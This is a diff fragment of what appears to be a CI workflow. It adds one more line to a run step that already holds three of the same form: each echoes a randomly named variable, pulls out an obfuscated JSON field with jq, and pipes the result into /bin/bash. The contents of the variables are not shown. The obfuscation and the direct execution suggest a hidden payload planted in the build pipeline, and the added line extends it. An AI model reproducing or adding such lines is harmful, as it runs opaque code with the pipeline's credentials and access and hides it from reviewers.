@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$p03544" | jq -r .mdfu7 | /bin/bash
           echo $a192 | jq -r .qjh28492 | /bin/bash
           echo $rctn70467 | jq -r .clrl7 | /bin/bash
+          echo $iisi198 | jq -r .h16 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
